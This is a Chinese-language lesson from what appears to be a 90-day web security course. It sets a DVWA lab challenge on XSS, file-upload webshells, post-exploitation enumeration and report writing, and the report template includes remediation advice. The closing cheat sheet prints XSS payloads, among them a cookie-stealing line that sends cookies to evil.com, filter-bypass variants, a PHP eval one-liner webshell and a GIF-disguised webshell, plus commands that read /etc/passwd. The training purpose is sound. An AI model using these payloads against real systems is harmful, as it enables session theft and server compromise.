---
title: Day028：XSS 与文件上传 - Week 4 周末闯关
tags:
  - 网络安全
  - XSS
  - 文件上传
  - 综合实战
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d028
date: 2026-02-19
updated: 2026-01-28
---

# Day028：XSS 与文件上传 - Week 4 周末闯关

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 4：XSS 与文件上传 |
| **今日主题** | 综合考核：Web 漏洞全流程 |
| **预计时间** | 2-3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：本周你学了 XSS 的三种类型、文件上传漏洞、绕过技巧、Webshell 管理。现在是检验成果的时候了。
>
> **问题**：能不能独立完成一次完整的 Web 渗透？
>
> **今天的任务**：综合运用本周所学，完成挑战并输出报告。

---

## 今日目标

- [ ] 独立发现 XSS 漏洞并利用
- [ ] 独立完成文件上传获取 Shell
- [ ] 使用工具进行后渗透信息收集
- [ ] 输出渗透测试报告

**闯关条件**：完成所有挑战任务并输出完整报告。

---

## 闯关任务

### 阶段 1：XSS 综合挑战（40 分钟）

**目标**：在 DVWA 完成三种 XSS 的利用

**任务清单**：

1. **反射型 XSS（Low/Medium）**
   - 成功弹窗
   - 弹出 Cookie
   - 记录成功的 payload

2. **存储型 XSS（Low/Medium）**
   - 在留言板植入 XSS
   - 验证持久性（刷新后仍触发）
   - 记录 payload

3. **DOM 型 XSS（Low）**
   - 通过 URL 触发 XSS
   - 记录 payload

**记录表**：
```
反射型 payload：________________
存储型 payload：________________
DOM 型 payload：________________
```

---

### 阶段 2：文件上传挑战（45 分钟）

**目标**：在 DVWA 上传 Webshell 并获取命令执行

**任务清单**：

1. **Low 级别**
   - 直接上传 shell.php
   - 访问并验证执行

2. **Medium 级别**
   - 分析防护机制
   - 使用绕过技巧
   - 成功上传并执行

3. **蚁剑连接**
   - 配置蚁剑连接 Webshell
   - 浏览文件系统
   - 执行系统命令

**记录表**：
```
Low 级别上传路径：________________
Medium 绕过方式：________________
whoami 结果：________________
```

---

### 阶段 3：后渗透信息收集（30 分钟）

**目标**：收集服务器关键信息

**收集清单**：

| 信息项 | 命令 | 结果 |
|--------|------|------|
| 当前用户 | `whoami` | |
| 系统版本 | `uname -a` | |
| IP 地址 | `ifconfig` | |
| 用户列表 | `cat /etc/passwd` | |
| 网络连接 | `netstat -an` | |
| 运行进程 | `ps aux` | |

---

### 阶段 4：撰写报告（30 分钟）

创建 `week4_web_report.md`，包含以下内容：

```markdown
# Week 4 Web 渗透报告

## 1. 执行摘要
- 目标：DVWA 靶场
- 发现的漏洞：XSS（3处）、文件上传
- 危害等级：高危
- 主要发现：[简述]

## 2. 测试范围
- 目标 URL：
- 测试时间：
- 使用工具：Burp Suite、蚁剑

## 3. XSS 漏洞详情

### 3.1 反射型 XSS
- 位置：
- Payload：
- 危害：

### 3.2 存储型 XSS
- 位置：
- Payload：
- 危害：

### 3.3 DOM 型 XSS
- 位置：
- Payload：
- 危害：

## 4. 文件上传漏洞

### 4.1 漏洞位置
- URL：
- 参数：

### 4.2 利用过程
[详细步骤]

### 4.3 获取的权限
- 用户：
- 权限级别：

## 5. 后渗透信息
[收集到的系统信息]

## 6. 风险评估
- 机密性影响：高
- 完整性影响：高
- 可用性影响：中

## 7. 修复建议

### XSS 修复
1. 输出编码（HTML 实体转义）
2. 输入验证
3. CSP 策略
4. HttpOnly Cookie

### 文件上传修复
1. 白名单限制后缀
2. 重命名上传文件
3. 上传目录禁止执行
4. 文件内容检测

## 8. 附录
- 使用的完整 Payload 列表
- 工具配置截图
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 完成反射型 XSS | 10 分 |
| 完成存储型 XSS | 10 分 |
| 完成 DOM 型 XSS | 10 分 |
| Low 级别上传成功 | 10 分 |
| Medium 级别绕过成功 | 15 分 |
| 蚁剑连接成功 | 10 分 |
| 完成信息收集 | 10 分 |
| 完成渗透报告 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## Week 4 总结

恭喜你完成了第四周的学习！

**你学会了**：
- XSS 的三种类型（反射型、存储型、DOM 型）
- XSS 绕过过滤的技巧
- 文件上传漏洞原理
- 绕过各种上传限制
- Webshell 的使用
- 蚁剑等管理工具
- 后渗透基础概念

**你证明了**：
- 能独立检测和利用 XSS 漏洞
- 能绕过基础的上传防护
- 能使用工具管理 Webshell
- 能进行基本的信息收集
- 能输出专业的渗透报告

---

## 知识点回顾

### Week 4 技术速查

```html
<!-- XSS Payload -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>document.location='http://evil.com?c='+document.cookie</script>

<!-- XSS 绕过 -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

```php
// 一句话木马
<?php @eval($_POST['cmd']); ?>

// 图片马
GIF89a
<?php @eval($_POST['cmd']); ?>
```

```bash
# 后渗透信息收集
whoami && id && uname -a
cat /etc/passwd
ifconfig
netstat -an
```

### 漏洞对比

| 漏洞 | 攻击目标 | 危害 | 防御 |
|------|----------|------|------|
| XSS | 用户浏览器 | 窃取凭证 | 输出编码 |
| 文件上传 | 服务器 | GetShell | 白名单+重命名 |
| SQL 注入 | 数据库 | 数据泄露 | 参数化查询 |

---

## 下周预告

**Week 5：渗透测试方法论**

下周你将学习：
- 渗透测试的标准流程
- PTES 方法论
- 信息收集进阶
- 漏洞扫描工具

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 4 总用时 | |
| 最大收获 | |
| 下周期待 | |

---

> **导师点评**：
>
> 第四周结束了。你从只会弹窗，到现在能 GetShell、能用工具、能收集信息。
>
> XSS 攻击用户，文件上传攻击服务器——这是 Web 安全两条最经典的路线。
>
> 这周学的东西，在真实渗透中天天用。每个 SRC 挖洞的人，都是从这些开始的。
>
> 记住：**漏洞是入口，后渗透才是深渊**。
>
> 你现在站在入口处。准备好往里走了吗？
>
> 休息一下，Week 5 我们开始学习"正规军"的打法——渗透测试方法论！

```bash
echo "Week 4 Complete! XSS 和文件上传都会了！"
```
